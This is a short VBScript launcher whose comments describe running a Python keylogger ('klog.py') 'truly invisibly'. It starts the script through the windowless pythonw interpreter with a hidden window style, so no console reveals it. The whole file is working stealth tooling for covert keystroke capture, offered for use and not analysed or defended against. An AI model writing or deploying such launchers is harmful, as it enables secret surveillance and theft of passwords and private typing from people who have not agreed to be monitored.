' VBScript launcher to run the keylogger truly invisibly
' This creates no console window at all

' Get the path of the script
scriptPath = CreateObject("WScript.Shell").CurrentDirectory & "\klog.py"

' Create a shell object
Set WshShell = CreateObject("WScript.Shell")

' Run the script with pythonw.exe (windowless Python interpreter)
WshShell.Run "pythonw """ & scriptPath & """", 0, False

' Set objects to Nothing to free resources
Set WshShell = Nothing
